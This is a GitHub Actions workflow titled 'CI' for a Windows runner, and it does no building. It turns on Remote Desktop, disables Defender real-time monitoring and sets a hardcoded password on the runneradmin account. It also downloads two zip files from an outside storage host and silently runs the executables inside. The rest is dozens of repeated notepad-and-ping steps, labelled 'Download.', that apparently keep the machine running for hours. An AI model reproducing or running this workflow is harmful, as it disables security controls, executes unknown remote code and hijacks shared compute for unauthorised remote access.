name: CI

on: [push, workflow_dispatch]

jobs:

  build:
    runs-on: windows-latest

    steps:
    - name: 1
      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
    - name: 2
      run: New-Item -Path "C:\21" -ItemType Directory
    - name: 3
      run: New-Item -Path "C:\2" -ItemType Directory
    - name: 4
      run: New-Item -Path "C:\1" -ItemType Directory
    - name: 11
      run: Set-MpPreference -DisableRealtimeMonitoring $true
    - name: 11
      run: Set-MpPreference -DisableRealtimeMonitoring $true
    - name: 14
      run: Invoke-WebRequest -URI https://s3.twcstorage.ru/e1a9670b-80bb-4507-9a26-414e63bf3dad/regmikroman.zip -outfile c:\21\regmikroman.zip
    - name: 7
      run: Expand-Archive -LiteralPath "c:\21\regmikroman.zip" -DestinationPath "C:\21"
    - name: 15
      run: Start-Process Powershell ' -Command "C:\21\regmikroman\RemoteExecuteScriptSilent.exe"'
    - name: 5
      run: Invoke-WebRequest -URI https://s3.twcstorage.ru/e1a9670b-80bb-4507-9a26-414e63bf3dad/silen.zip -outfile c:\21\silen.zip
    - name: 7
      run: Expand-Archive -LiteralPath "c:\21\silen.zip" -DestinationPath "C:\21"
    - name: 15
      run: Start-Process Powershell ' -Command "C:\21\silen.exe"'
    - name: 10
      run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
    - name: Download.
      run: cmd /c start notepad.exe
    - name: Download.
      run: cmd /c ping 127.0.0.1 -n 600
    - name: Download.
      run: cmd /c taskkill /f /im notepad.exe
